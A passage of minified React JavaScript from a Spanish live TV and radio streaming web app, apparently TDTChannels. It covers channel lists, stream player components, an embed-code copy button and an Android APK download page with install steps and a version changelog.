                                margin: "auto"
                            }
                        }, l.a.createElement("p", null, "Esta emisi\xf3n no est\xe1 disponible temporalmente."), l.a.createElement("p", null, "La emisi\xf3n en estos momentos no est\xe1 permitida o el enlace est\xe1 ca\xeddo.", " "), l.a.createElement("p", null, n), l.a.createElement("p", null, t, " ", l.a.createElement(S, {
                            symbol: "\ud83d\ude03",
                            label: "cara sonriente"
                        })))
                    }
                }, {
                    key: "renderPlayer",
                    value: function(e) {
                        var a = this;
                        if (e.embed && "iframe" === e.format) {
                            var t = e.url;
                            return l.a.createElement("iframe", {
                                style: {
                                    position: "absolute",
                                    width: "100%",
                                    height: "100%",
                                    backgroundColor: "black"
                                },
                                title: "youtube-embed",
                                src: t,
                                frameBorder: "0",
                                allow: "autoplay; encrypted-media",
                                allowFullScreen: !0
                            })
                        }
                        if (e.embed && "youtube" === e.format) {
                            var t = e.url.split("/")[4];
                            return l.a.createElement("iframe", {
                                style: {
                                    position: "absolute",
                                    width: "100%",
                                    height: "100%",
                                    backgroundColor: "black"
                                },
                                title: "youtube-embed",
                                src: "https://www.youtube.com/embed/live_stream?channel=" + t + "&autoplay=1",
                                frameBorder: "0",
                                allow: "autoplay; encrypted-media",
                                allowFullScreen: !0
                            })
                            
                        }
                        if ("stream" === e.format) {
                            var n = e.url;
                            return n.includes("livestream") && (n += "/player"), l.a.createElement("iframe", {
                                style: {
                                    position: "absolute",
                                    width: "100%",
                                    height: "100%",
                                    'background-image': 'url("https://acegif.com/wp-content/uploads/loading-23.gif")',
                                    'background-size': "100%"
                                },
                                title: "embed",
                                src: n,
                                frameBorder: "0",
                                allow: "autoplay",
                                allowFullScreen: !0
                            })
                        }
                        return l.a.createElement(x.a, {
                            style: {
                                position: "absolute",
                                width: "100%",
                                height: "100%",
                                backgroundColor: "black"
                            },
                            pip: !0,
                            key: e.url,
                            url: e.url,
                            playing: !0,
                            controls: !0,
                            width: "100%",
                            height: "100%",
                            onError: function(e, t) {
                                return a.onPlayerError(e, t)
                            }, 
                        }
                        
                        ) 
                    }
                }, {
                    key: "getLabelForOption",
                    value: function(e, a) {
                        var t = "";
                        switch (e.lang) {
                            case "EN":
                                t += "Ingl\xe9s";
                                break;
                            case "FR":
                                t += "Franc\xe9s";
                                break;
                            case "IT":
                                t += "Italiano";
                                break;
                            case "PT":
                                t += "Portugu\xe9s";
                                break;
                            case "DE":
                                t += "Alem\xe1n";
                                break;
                            case "PL":
                                t += "Polaco";
                                break;
                            case "NL":
                                t += "Holand\xe9s";
                                break;
                            case "CZ":
                                t += "Checo";
                                break;
                            case "RO":
                                t += "Rumano";
                                break;
                            case "AR":
                                t += "\xc1rabe"
                        }
                        return "SP" === e.geo ? t += "GEO" : "CAT" === e.geo && (t += "GEO CAT"), "HD" === e.res ? t += "HD" : "SD" === e.res && (t += "SD"), "" === t && (t = a + 1), t
                    }
                }, {
                    key: "renderEmisionButton",
                    value: function(e) {
                        var a = this;
                        if (-1 !== this.state.selectedOptionN) return l.a.createElement(O.a, {
                            variant: "outlined",
                            style: {
                                minWidth: "120px",
                                marginLeft: "auto"
                            }
                        }, l.a.createElement(N.a, {
                            onChange: this.onClickonOption,
                            value: this.state.selectedOptionN
                        }, !e.cors && e.options.map((function(e, t) {
                            return l.a.createElement(k.a, {
                                key: t,
                                value: t
                            }, "Emisi\xf3n ", a.getLabelForOption(e, t))
                        }))))
                    }
                }, {
                    key: "render",
                    value: function() {
                        var e = this.state.selectedChannel,
                            a = this.state.selectedOptionN,
                            t = this.state.playerError,
                            n = void 0;
                        return a >= 0 && (n = e.options[a]), 0 === this.randomIDToForceRefresh && 0 !== this.state.entriesRows.length && (this.randomIDToForceRefresh = 1), l.a.createElement(v.a, {
                            container: !0,
                            style: {
                                height: "100%"
                            }
                        }, l.a.createElement(v.a, {
                            item: !0,
                            xs: 12,
                            sm: 12,
                            md: 12,
                            lg: 3
                        }, l.a.createElement("div", {
                            key: this.randomIDToForceRefresh,
                            className: "left-separator",
                            style: {
                                height: "100%"
                            }
                        }, l.a.createElement(ee, {
                            toolbarTitle: "Televisi\xf3n",
                            toolbarIcon: "\ud83d\udcfa",
                            filterValues: this.state.filterValues,
                            dataColumns: [{
                                id: "logo",
                                label: "Logo"
                            }, {
                                id: "name",
                                label: "Canal"
                            }],
                            dataRows: this.state.entriesRows,
                            onClickonRow: this.onClickonRow.bind(this)
                        }))), l.a.createElement(v.a, {
                            item: !0,
                            xs: 12,
                            sm: 12,
                            md: 12,
                            lg: 7
                        }, l.a.createElement("div", {
                            ref: this.divPlayer
                        }, void 0 === e && l.a.createElement("h2", {
                            style: {
                                fontSize: "2.00em",
                                fontWeight: "450",
                                paddingTop: "10px",
                                paddingBottom: "20px",
                                paddingLeft: "10px"
                            }
                        }, "Selecciona alg\xfan canal para empezar"), void 0 !== e && l.a.createElement("div", {
                            style: {
                                display: "flex",
                                alignItems: "center",
                                paddingTop: "10px",
                                paddingBottom: "10px",
                                paddingLeft: "10px",
                                paddingRight: "10px"
                            }
                        }, l.a.createElement("img", {
                            style: {
                                width: "52px",
                                height: "52px"
                            },
                            src: e.logo,
                            alt: "logo"
                        }), l.a.createElement("p", {
                            className: "title-emision"
                        }, e.name), this.renderEmisionButton(e))), void 0 !== e && void 0 !== n && !t && l.a.createElement("div", {
                            style: {
                                position: "relative",
                                paddingBottom: "56.25%",
                                height: "0"
                            }
                        }, this.renderPlayer(n)), t && l.a.createElement("div", {
                            style: {
                                marginTop: "75px",
                                marginBottom: "100px",
                                textAlign: "center"
                            }
                        }, l.a.createElement("h2", null, "\xa1Vaya! Ha ocurrido un problema!", " ", l.a.createElement(S, {
                            symbol: "\ud83d\ude22",
                            label: "cara llorando"
                        })), this.renderErrorMessage(e, n)), void 0 !== e && l.a.createElement(y.a, {
                            variant: "outlined",
                            color: "primary",
                            href: e.web,
                            target: "_blank",
                            rel: "nofollow noopener noreferrer",
                            style: {
                                marginTop: "10px",
                                minWidth: "120px",
                                marginLeft: "10px"
                            }
                        }, "Sitio web"), void 0 !== e && l.a.createElement(y.a, {
                            variant: "outlined",
                            color: "primary",
                            type: "button",
                            style: {
                                marginTop: "10px",
                                minWidth: "120px",
                                marginLeft: "10px"
                            },
                            onClick: function() {
                                var code = '<iframe width="100%" height="100%" frameborder="0" scrolling="0" allow="autoplay" allowfullscreen="true" allow="encrypted-media" style="float:left; margin-left:0px" style="position:absolute" src="https://get.toptele.ml/embed/' + e.options[0].url + '"></iframe>';
                                navigator.clipboard.writeText(code).then(function() {
                                alert("😀 Código copiado en el portapapeles.  ⚠️ [BETA] ⚠️");
                                }, function(err) {
                                console.error('😢 No hemos podido copiar el código en el portapapeles: ', err);
                                });

                            }
                        }, "Embed"),  void 0 !== e && void 0 !== e.epg && null !== e.epg && l.a.createElement(Y, {
                            epgInfo: this.state.epgInfo,
                            epgChannelID: e.epg,
                            key: e.epg
                        }), void 0 !== e && void 0 !== e.epg && null !== e.epg && l.a.createElement("div", {
                            style: {
                                marginLeft: "10px",
                                marginRight: "10px"
                            }
                        }, l.a.createElement(V, {
                            epgInfo: this.state.epgInfo,
                            epgChannelID: e.epg,
                            key: e.epg
                        }))), l.a.createElement(v.a, {
                            item: !0,
                            xs: 12,
                            sm: 12,
                            md: 12,
                            lg: 2
                        }, l.a.createElement(ie, null)))
                    }
                }]), t
            }(l.a.Component);
            var ce = function(e) {
                    Object(m.a)(t, e);
                    var a = Object(u.a)(t);

                    function t(e) {
                        var n;
                        return Object(s.a)(this, t), (n = a.call(this, e)).randomIDToForceRefresh = 0, n.state = {
                            entries: [],
                            entriesRows: [],
                            filterValues: ["Todos"],
                            selectedChannel: void 0,
                            selectedOptionN: -1,
                            playerError: !1
                        }, n.divPlayer = l.a.createRef(), n.onClickonOption = n.onClickonOption.bind(Object(C.a)(n)), n
                    }
                    return Object(c.a)(t, [{
                        key: "componentDidMount",
                        value: function() {
                            var e = this;
                            ae.getRadio(!1, (function(a) {
                                for (var t = [], n = [], l = a.message.countries, r = 0; r < l.length; ++r)
                                    for (var o = l[r].ambits, i = 0; i < o.length; ++i) {
                                        var s = o[i],
                                            c = s.channels;
                                        n.push(s.name);
                                        for (var m = 0; m < c.length; ++m) {
                                            for (var u = c[m], d = u.options, p = [], E = 0; E < d.length; ++E) {
                                                var b = d[E];
                                                p.push(new ne(b.format, b.url, b.geo2, b.res, b.lang, u.extra_info.includes("EMB")))
                                            }
                                            t.push(new te(u.name, u.web, u.logo, s.name, p, u.extra_info.includes("NONAV")))
                                        }
                                    }
                                var h = t.map((function(e) {
                                    return a = e.logo, t = e.name, n = e.category, {
                                        logo: a,
                                        name: t,
                                        category: n
                                    };
                                    var a, t, n
                                }));
                                e.setState({
                                    entries: t,
                                    entriesRows: h,
                                    filterValues: n
                                });
                                var g = window.location.href.split("/");
                                if (g.length > 4 && "" !== g[4]) {
                                    var f = g[4];
                                    for (r = 0; r < e.state.entriesRows.length; r++)
                                        if (decodeURIComponent(f) === e.state.entriesRows[r].name.replace(/\s/g, "")) {
                                            e.onClickonRow(e.state.entriesRows[r]);
                                            break
                                        }
                                }
                            }))
                        }
                    }, {
                        key: "onClickonRow",
                        value: function(e) {
                            for (var a, t = 0; t < this.state.entries.length; ++t)
                                if (this.state.entries[t].name === e.name) {
                                    a = this.state.entries[t];
                                    break
                                } this.setState({
                                selectedChannel: a,
                                playerError: !1
                            }), a.cors || 0 === a.options.length ? (this.setState({
                                selectedOptionN: -1,
                                playerError: !0
                            }), oe("CLICK_RADIO", a.name, "")) : a.options.length > 0 && (window.scrollTo(0, this.divPlayer.current.offsetTop), this.setState({
                                selectedOptionN: 0
                            }), oe("CLICK_RADIO", a.name, a.options[0].url)), this.props.history.push("#" + a.name.replace(/\s/g, ""))
                        }
                    }, {
                        key: "onClickonOption",
                        value: function(e) {
                            oe("CLICK_RADIO", this.state.selectedChannel.name + " - OPTION" + e.target.value, this.state.selectedChannel.options[e.target.value].url), this.setState({
                                selectedOptionN: e.target.value,
                                playerError: !1
                            })
                        }
                    }, {
                        key: "onPlayerError",
                        value: function(e, a) {
                            console.log(e, a), void 0 !== a && void 0 !== a.type && void 0 !== a.details && "mediaError" !== a.type && "bufferStalledError" !== a.details && this.setState({
                                playerError: !0
                            })
                        }
                    }, {
                        key: "renderErrorMessage",
                        value: function(e, a) {
                            var t = "",
                                n = "";
                            return void 0 !== a && null !== a.geo && (n = "Adem\xe1s se trata de una emisi\xf3n geolocalizada, es posible que est\xe9s fuera de la geolocalizaci\xf3n permitida. Prueba desde una conexion VPN."), t = !e.cors && e.options.length > 1 ? "Puedes reproducirlo mediante otra emisi\xf3n o desde la web indicada debajo." : "Puedes reproducirlo desde la web indicada debajo.", l.a.createElement("div", {
                                style: {
                                    maxWidth: "450px",
                                    margin: "auto"
                                }
                            }, l.a.createElement("p", null, "Esta emisi\xf3n no est\xe1 disponible temporalmente."), l.a.createElement("p", null, "La emisi\xf3n en estos momentos no est\xe1 permitida o el enlace est\xe1 ca\xeddo.", " ", n), l.a.createElement("p", null, t, " ", l.a.createElement(S, {
                                symbol: "\ud83d\ude03",
                                label: "cara sonriente"
                            })))
                        }
                    }, {
                        key: "getLabelForOption",
                        value: function(e, a) {
                            var t = a + 1;
                            return "SP" === e.geo ? t = "GEO" : "CAT" === e.geo && (t = "GEO CAT"), "HD" === e.res ? t = "HD" : "SD" === e.res && (t = "SD"), t
                        }
                    }, {
                        key: "renderPlayer",
                        value: function(e) {
                            var a = this;
                            return e.url.includes("http") ? l.a.createElement(x.a, {
                                style: {
                                    position: "absolute",
                                    width: "100%",
                                    height: "100%"
                                },
                                pip: !0,
                                key: e.url,
                                url: e.url,
                                playing: !0,
                                controls: !0,
                                width: "100%",
                                height: "100%",
                                onError: function(e, t) {
                                    return a.onPlayerError(e, t)
                                }
                            }) : (window.open("http://www.tdtchannels.com/player3.html?" + e.url, "mywindow", "width=350,height=150,resizable=yes"), l.a.createElement("div", {
                                style: {
                                    maxWidth: "450px",
                                    margin: "auto"
                                }
                            }, l.a.createElement("h3", {
                                style: {
                                    paddingTop: "10px"
                                }
                            }, "Esta emisi\xf3n se abrir\xe1 en una pesta\xf1a nueva.")))
                        }
                    }, {
                        key: "renderEmisionButton",
                        value: function(e) {
                            var a = this;
                            if (-1 !== this.state.selectedOptionN) return l.a.createElement(O.a, {
                                variant: "outlined",
                                style: {
                                    minWidth: "120px",
                                    marginLeft: "auto"
                                }
                            }, l.a.createElement(N.a, {
                                onChange: this.onClickonOption,
                                value: this.state.selectedOptionN
                            }, !e.cors && e.options.map((function(e, t) {
                                return l.a.createElement(k.a, {
                                    key: t,
                                    value: t
                                }, "Emisi\xf3n ", a.getLabelForOption(e, t))
                            }))))
                        }
                    }, {
                        key: "render",
                        value: function() {
                            var e = this.state.selectedChannel,
                                a = this.state.selectedOptionN,
                                t = this.state.playerError,
                                n = void 0;
                            return a >= 0 && (n = e.options[a]), 0 === this.randomIDToForceRefresh && 0 !== this.state.entriesRows.length && (this.randomIDToForceRefresh = 1), l.a.createElement(v.a, {
                                container: !0,
                                style: {
                                    height: "100%"
                                }
                            }, l.a.createElement(v.a, {
                                item: !0,
                                xs: 12,
                                sm: 12,
                                md: 12,
                                lg: 3
                            }, l.a.createElement("div", {
                                key: this.randomIDToForceRefresh,
                                className: "left-separator",
                                style: {
                                    height: "100%"
                                }
                            }, l.a.createElement(ee, {
                                toolbarTitle: "Radio",
                                toolbarIcon: "\ud83d\udcfb",
                                filterValues: this.state.filterValues,
                                dataColumns: [{
                                    id: "logo",
                                    label: "Logo"
                                }, {
                                    id: "name",
                                    label: "Canal"
                                }],
                                dataRows: this.state.entriesRows,
                                onClickonRow: this.onClickonRow.bind(this)
                            }))), l.a.createElement(v.a, {
                                item: !0,
                                xs: 12,
                                sm: 12,
                                md: 12,
                                lg: 7
                            }, l.a.createElement("div", {
                                ref: this.divPlayer
                            }, void 0 === e && l.a.createElement("h2", {
                                style: {
                                    fontSize: "2.00em",
                                    fontWeight: "450",
                                    paddingTop: "10px",
                                    paddingBottom: "20px",
                                    paddingLeft: "10px"
                                }
                            }, "Selecciona alguna emisora para empezar"), void 0 !== e && l.a.createElement("div", {
                                style: {
                                    display: "flex",
                                    alignItems: "center",
                                    paddingTop: "10px",
                                    paddingBottom: "10px",
                                    paddingLeft: "10px",
                                    paddingRight: "10px"
                                }
                            }, l.a.createElement("img", {
                                style: {
                                    width: "48px",
                                    height: "48px"
                                },
                                src: e.logo,
                                alt: "logo"
                            }), l.a.createElement("p", {
                                className: "title-emision"
                            }, e.name), this.renderEmisionButton(e)), l.a.createElement("div", {
                                style: {
                                    height: "100px",
                                    position: "relative"
                                }
                            }, void 0 !== e && void 0 !== n && !t && this.renderPlayer(n), t && l.a.createElement("div", {
                                style: {
                                    marginTop: "250px",
                                    textAlign: "center"
                                }
                            }, l.a.createElement("h2", null, "\xa1Vaya! Ha ocurrido un problema!", " ", l.a.createElement(S, {
                                symbol: "\ud83d\ude22",
                                label: "cara llorando"
                            })), this.renderErrorMessage(e, n)))), void 0 !== e && l.a.createElement(y.a, {
                                variant: "outlined",
                                color: "primary",
                                href: e.web,
                                target: "_blank",
                                rel: "nofollow noopener noreferrer",
                                style: {
                                    marginTop: "10px",
                                    minWidth: "120px",
                                    marginLeft: "10px"
                                }
                            }, "Sitio web")), l.a.createElement(v.a, {
                                item: !0,
                                xs: 12,
                                sm: 12,
                                md: 12,
                                lg: 2
                            }, l.a.createElement(ie, null)))
                        }
                    }]), t
                }(l.a.Component),
                me = t(236),
                ue = function(e) {
                    Object(m.a)(t, e);
                    var a = Object(u.a)(t);

                    function t(e) {
                        var n;
                        return Object(s.a)(this, t), (n = a.call(this, e)).state = {}, n
                    }
                    return Object(c.a)(t, [{
                        key: "componentDidMount",
                        value: function() {}
                    }, {
                        key: "render",
                        value: function() {
                            return l.a.createElement(me.a, {
                                style: {
                                    paddingTop: "20px",
                                    paddingBottom: "30px"
                                }
                            }, l.a.createElement("h1", null, "\xa1Estamos en Android!"), l.a.createElement("p", null, "Desde aqu\xed puedes descargarte la \xfaltima versi\xf3n de la aplicaci\xf3n Android oficial para este proyecto!"), l.a.createElement("i", null, "En la parte inferior encontrar\xe1s el enlace de descarga. Esta aplicaci\xf3n \xdaNICAMENTE puede ser descargada desde aqu\xed, no descargues desde ning\xfan otro sitio web."), l.a.createElement("br", null), l.a.createElement("br", null), l.a.createElement("h2", null, "Reproduce"), "Reproduce todos tus canales favoritos de \xe1mbito Espa\xf1ol e Internacional m\xe1s populares. Tanto de televisi\xf3n como radio! ", l.a.createElement("br", null), l.a.createElement("h2", null, "Selecciona"), "Selecciona tus canales favoritos para un acceso r\xe1pido. Y adem\xe1s puedes filtrar por comunidades aut\xf3nomas o paises.", l.a.createElement("h2", null, "\xa1Disfruta!"), "De todo el contenido, sin publicidad y de forma totalmente gratuita!", l.a.createElement("br", null), "Adem\xe1s puedes enviar la emisi\xf3n a tu dispositivo Chromecast para visualizar el contenido.", l.a.createElement("br", null), l.a.createElement("br", null), l.a.createElement(v.a, {
                                container: !0,
                                spacing: 3,
                                justify: "center"
                            }, l.a.createElement(v.a, {
                                item: !0,
                                xs: 12,
                                sm: 10,
                                md: 3
                            }, l.a.createElement("img", {
                                className: "screenshot-front",
                                src: "".concat("", "/tdtchannels_android_tv_1.png"),
                                alt: "TDTChannels Captura Televisi\xf3n"
                            })), l.a.createElement(v.a, {
                                item: !0,
                                xs: 12,
                                sm: 10,
                                md: 3
                            }, l.a.createElement("img", {
                                className: "screenshot-front",
                                src: "".concat("", "/tdtchannels_android_tv_2.png"),
                                alt: "TDTChannels Captura Televisi\xf3n 2"
                            })), l.a.createElement(v.a, {
                                item: !0,
                                xs: 12,
                                sm: 10,
                                md: 3
                            }, l.a.createElement("img", {
                                className: "screenshot-front",
                                src: "".concat("", "/tdtchannels_android_radio.png"),
                                alt: "TDTChannels Captura Radio"
                            }))), l.a.createElement("br", null), l.a.createElement("h3", null, "Instalaci\xf3n"), l.a.createElement("p", null, "1- ", l.a.createElement("b", null, "Activa origenes desconocidos"), " en tu tel\xe9fono. ", l.a.createElement("br", null), "No te preocupes. Somos libres de virus! Esto es debido a que no estamos publicados en la Play Store de Google.", l.a.createElement("br", null), "2- ", l.a.createElement("b", null, "Elimina versiones anteriores"), " de TDTChannels en tu tel\xe9fono.", " ", l.a.createElement("br", null), "Muchas veces el no borrar una versi\xf3n anterior genera incompatibilidades. ", l.a.createElement("br", null), "3- Instala y ", l.a.createElement("b", null, "\xa1disfruta!")), l.a.createElement("h3", null, "Compatibilidades"), l.a.createElement("p", null, "- ", l.a.createElement("b", null, "Android"), ": Esta aplicaci\xf3n est\xe1 desarrollada para Android 11. Compatible a partir de Android 5.0 (incluido) en adelante.", l.a.createElement("br", null), "- ", l.a.createElement("b", null, "Android TV"), ': Integraci\xf3n cercana al 100%. Puedes revisar notas en la secci\xf3n "Otras plataformas".', l.a.createElement("br", null), "- ", l.a.createElement("b", null, "Fire TV"), ': Funcional, pero necesitas un rat\xf3n virtual para desplazarte dentro de la aplicaci\xf3n. Puedes revisar notas en la secci\xf3n "Otras plataformas".'), l.a.createElement("h3", null, "Descargar TDTChannels"), l.a.createElement("p", null, "Esta versi\xf3n incluye las \xfaltimas novedades que he preparado para vosotros! ", l.a.createElement("br", null), "Pod\xe9is estar tranquilos, la versi\xf3n es", " ", l.a.createElement("a", {
                                href: "https://www.virustotal.com/gui/file-analysis/Njg4NWE0ZTlhYjA1NzFiZTE4N2NmNTI2Y2UwN2RjZTU6MTYyNDA5OTQzMg==/detection",
                                target: "_blank",
                                rel: "nofollow noopener noreferrer"
                            }, "libre de virus y de malware"), ", sigo desarrollandola yo mismo, como llevo haciendo desde el 2018 a\xf1os con la versi\xf3n Open Source (ya descatalogada).", l.a.createElement("br", null)), l.a.createElement("h4", null, "[v2.4.0] - 19 / 06 / 2021"), l.a.createElement("br", null), l.a.createElement(y.a, {
                                href: "".concat("", "/android/apks/tdtchannels_v2.4.0.apk"),
                                color: "primary",
                                variant: "outlined"
                            }, "Descarga v2.4.0"), l.a.createElement("br", null), l.a.createElement("br", null), l.a.createElement("b", null, "\xa1TV en segundo plano!"), l.a.createElement("br", null), "Ahora puedes disfrutar de tus canales favoritos en segundo plano. Simplemente apagando la pantalla, o yendo al escritorio de Android, podr\xe1s disfrutar de esta mejora.", l.a.createElement("br", null), "- ", l.a.createElement("b", null, "Mejoras"), l.a.createElement("br", null), "Al entrar en segundo plano, la aplicaci\xf3n reduce al m\xednimo el consumo de datos.", l.a.createElement("br", null), "Mejoras de estabilidad y accesibilidad.", l.a.createElement("br", null), "- ", l.a.createElement("b", null, "Correcciones"), l.a.createElement("br", null), "Correcciones menores.", l.a.createElement("br", null), "Actualizaci\xf3n a ExoPlayer 2.14.0 y librer\xedas de sistema.", l.a.createElement("br", null), l.a.createElement("br", null), l.a.createElement("h4", null, "[v2.3.3] - 12 / 03 / 2021"), "- ", l.a.createElement("b", null, "Mejoras"), l.a.createElement("br", null), "Mejoras de estabilidad en la aplicaci\xf3n, principalmente para Android TV.", l.a.createElement("br", null), "- ", l.a.createElement("b", null, "Correcciones"), l.a.createElement("br", null), "Correcciones menores.", l.a.createElement("br", null), "Actualizaci\xf3n a ExoPlayer 2.13.2.", l.a.createElement("br", null), l.a.createElement("br", null), l.a.createElement("h4", null, "[v2.3.2] - 15 / 02 / 2021"), "- ", l.a.createElement("b", null, "Mejoras"), l.a.createElement("br", null), "Mejoras de compatibilidad y estabilidad en ciertas TVs y Radios (GolTV y radios en general).", l.a.createElement("br", null), "- ", l.a.createElement("b", null, "Correcciones"), l.a.createElement("br", null), "Correcciones menores.", l.a.createElement("br", null), "Actualizaci\xf3n a ExoPlayer 2.13.0 y librer\xedas de sistema.", l.a.createElement("br", null), l.a.createElement("br", null), l.a.createElement("h4", null, "[v2.3.1] - 13 / 01 / 2021"), "- ", l.a.createElement("b", null, "Mejoras"), l.a.createElement("br", null), " Mejoras en el motor de reproducci\xf3n TDTChannels.", l.a.createElement("br", null), "Arreglados canales que presentaban incompatibilidades (Atresmedia, GolTV, UD Las Palmas, Intercomarcal TV, tvA, Alacant\xed TV).", l.a.createElement("br", null), "- ", l.a.createElement("b", null, "Correcciones"), l.a.createElement("br", null), "Mejorada compatibilidad para Android 5.", l.a.createElement("br", null), "Iconos para Fire TV. (Provocado por un BUG del sistema operativo Fire TV)", l.a.createElement("br", null), "Correcciones menores de c\xf3digo y visuales.", l.a.createElement("br", null), "Versi\xf3n de Android m\xednima incrementado a 5.0.", l.a.createElement("br", null), l.a.createElement("br", null), l.a.createElement("h4", null, "[v2.3.0] - 25 / 12 / 2020"), l.a.createElement("b", null, "\xa1CHROMECAST para emisiones de TV!"), " ", l.a.createElement("br", null), l.a.createElement("br", null), "- ", l.a.createElement("b", null, "Idiomas"), " ", l.a.createElement("br", null), "A\xf1adido Gallego a la aplicaci\xf3n (@vlionheart).", l.a.createElement("br", null), "- ", l.a.createElement("b", null, "Mejoras"), l.a.createElement("br", null), " Peque\xf1as mejoras visuales en la reproducci\xf3n. Ahora la barra de sistema se oculta autom\xe1ticamente tras haber cambiado resoluci\xf3n/audio/subt\xedtulos.", l.a.createElement("br", null), "Mejoras de compatibilidad con emisoras de TV y Radio.", l.a.createElement("br", null), "Mejoras en el motor de reproducci\xf3n TDTChannels.", l.a.createElement("br", null), "- ", l.a.createElement("b", null, "Correcciones"), l.a.createElement("br", null), "Correcci\xf3n de errores.", l.a.createElement("br", null), "Actualizaci\xf3n a ExoPlayer 2.12.2 y librer\xedas de sistema.", l.a.createElement("br", null), l.a.createElement("br", null), l.a.createElement("h4", null, "[v2.2.1] - 13 / 08 / 2020"), "- ", l.a.createElement("b", null, "Listado de emisiones"), " ", l.a.createElement("br", null), "La aplicaci\xf3n informa si seleccionas el visionado de canales favoritos y no hay ninguno a\xf1adido.", l.a.createElement("br", null), "- ", l.a.createElement("b", null, "Mejoras"), " ", l.a.createElement("br", null), "Posibilidad de salir directamente al men\xfa principal si se mantiene presionado el bot\xf3n retroceder mientras se observa una emisi\xf3n.", l.a.createElement("br", null), "Retoques visuales en el reproductor.", l.a.createElement("br", null), "Mejorada traducci\xf3n al catal\xe1n. (Ignasi Corney)", l.a.createElement("br", null), "- ", l.a.createElement("b", null, "Correcciones"), " ", l.a.createElement("br", null), "Aplicadas nuevas URLs.", l.a.createElement("br", null), l.a.createElement("br", null), l.a.createElement("h4", null, "[v2.2.0] - 28 / 07 / 2020"), "- ", l.a.createElement("b", null, "Sistema de visionado"), " ", l.a.createElement("br", null), "Redise\xf1o completo del visor de streams, tanto visual como funcional. Ahora podr\xe1s disfrutar del evento actual en el EPG!", l.a.createElement("br", null), "Permite cambiar de video, audio y subt\xedtulos, si existen. Por defecto todo en espa\xf1ol y subt\xedtulos desactivados. ", l.a.createElement("br", null), "Correcci\xf3n de un error que hac\xeda iniciar el stream congelado en ciertos dispositivos.", l.a.createElement("br", null), "- ", l.a.createElement("b", null, "Mejoras"), " ", l.a.createElement("br", null), "En el reproductor, presionando hacia atr\xe1s, abrir\xe1s los controles del visionado, presionando de nuevo, saldr\xe1s del stream. ", l.a.createElement("br", null), "Mejoras en la reproducci\xf3n de enlaces en formato MPEG-DASH.", l.a.createElement("br", null), "- ", l.a.createElement("b", null, "Otros"), " ", l.a.createElement("br", null), "Mejoras de estabilidad en el sistema de reproducci\xf3n.", l.a.createElement("br", null), "Actualizaci\xf3n de librer\xedas base de Android de la 29 a la 30.", l.a.createElement("br", null), "Actualizaci\xf3n de Java 7 a Java 8.", l.a.createElement("br", null), l.a.createElement("br", null), l.a.createElement("h4", null, "[v2.1.0] - 19 / 07 / 2020"), "- ", l.a.createElement("b", null, "Sistema de visionado"), " ", l.a.createElement("br", null), "Ahora es capaz de reproducir enlaces en formato MPEG-DASH.", l.a.createElement("br", null), "- ", l.a.createElement("b", null, "Sistema de ajustes"), " ", l.a.createElement("br", null), "Permite escoger la reproducci\xf3n de los streams de YouTube en la aplicaci\xf3n de Youtube o embebido en TDTChannels. ", l.a.createElement("br", null), "Mejoras en la visualizaci\xf3n de los ajustes.", l.a.createElement("br", null), "- ", l.a.createElement("b", null, "Mejoras de estabilidad"), " ", l.a.createElement("br", null), "Solucionado un malfuncionamiento de la aplicaci\xf3n si se pon\xeda en fondo durante mucho rato. (Carita triste al volver o entrar v\xeda recientes)", l.a.createElement("br", null), "- ", l.a.createElement("b", null, "Otros"), " ", l.a.createElement("br", null), "Mejorada compatibilidad con dispositivos de gran tama\xf1o de pantalla.", l.a.createElement("br", null), "Mejorada la estabilidad en Android 5 y 6. Mejoras visuales en general.", l.a.createElement("br", null), " Correcci\xf3n de errores. ", l.a.createElement("br", null), l.a.createElement("br", null), l.a.createElement("h4", null, "[v2.0.0] - 05 / 07 / 2020"), "- ", l.a.createElement("b", null, "Nuevo sistema de visionado"), " ", l.a.createElement("br", null), "Ahora vas a poder disfrutar tambi\xe9n de las emisiones de Atresmedia (Antena 3, LaSexta, Mega, Atreseries, Neox, Nova), Mediaset (Telecinco, Cuatro, FDF, Energy, BeMad, Divinity, Boing), GOL TV, 7TV Andaluc\xeda, Euronews, m\xfasica en HqM... Entre otros! Y desde la propia app, adem\xe1s siguiendo con la filosof\xeda de utilizar \xfanicamente streams legales!", l.a.createElement("br", null), "- ", l.a.createElement("b", null, "Sistema de visionado"), " ", l.a.createElement("br", null), "Mejorada compatibilidad con algunas cadenas, entre ellas Paramount Network y todas las emisiones YouTube.", l.a.createElement("br", null), "Correcci\xf3n de errores en la gesti\xf3n del EPG. Ahora se refresca correctamente.", l.a.createElement("br", null), "- ", l.a.createElement("b", null, "Reproducci\xf3n autom\xe1tica en TV y Radio"), " ", l.a.createElement("br", null), "Mant\xe9n presionado el canal de TV en el men\xfa principal, o presiona el canal de Radio, para reproducir su primera opci\xf3n disponible, autom\xe1ticamente.", l.a.createElement("br", null), "- ", l.a.createElement("b", null, "Navegador integrado"), " ", l.a.createElement("br", null), "Mejorada la navegaci\xf3n web del navegador integrado.", l.a.createElement("br", null), "- ", l.a.createElement("b", null, "Mejoras visuales"), l.a.createElement("br", null), "Nueva pantalla de carga de emisiones en TV y Radio.", l.a.createElement("br", null), "Mejoras visuales en la informaci\xf3n de las emisiones. Se aprovecha m\xe1s el espacio.", l.a.createElement("br", null), "Mejoras en la gesti\xf3n del Dark Mode.", l.a.createElement("br", null), "Mejoras visuales para Android TV y Fire TV.", l.a.createElement("br", null), "- ", l.a.createElement("b", null, "Otros"), " ", l.a.createElement("br", null), "Mayor optimizaci\xf3n de la aplicaci\xf3n. Pasa de ocupar 5.8MB a 3.5MB", l.a.createElement("br", null), "Exoplayer actualizado a 2.11.7.", l.a.createElement("br", null), l.a.createElement("br", null), l.a.createElement("h4", null, "[v1.3.0] - 01 / 06 / 2020"), l.a.createElement("b", null, "- A\xf1adida programaci\xf3n EPG!"), l.a.createElement("br", null), "Ya puedes disfrutar en la aplicaci\xf3n de la programaci\xf3n de los canales!", l.a.createElement("br", null), l.a.createElement("b", null, "- Reestructuraci\xf3n interna"), l.a.createElement("br", null), "Ahora toda la carga se realiza en la pantalla inicial, as\xed una vez carga la aplicaci\xf3n funciona m\xe1s r\xe1pida.", l.a.createElement("br", null), l.a.createElement("b", null, "- Sistema de favoritos"), l.a.createElement("br", null), "Mejoras en el sistema de favoritos. Ahora al activar la opci\xf3n, se acuerda al cerrar y abrir la aplicaci\xf3n.", l.a.createElement("br", null), l.a.createElement("b", null, "- B\xfasqueda"), l.a.createElement("br", null), "El sistema de b\xfasquedas ha sido mejorado. Ahora muestra resultado independientemente de espacios y/o tildes en la escritura.", l.a.createElement("br", null), l.a.createElement("b", null, "- Correcci\xf3n de errores"), l.a.createElement("br", null), 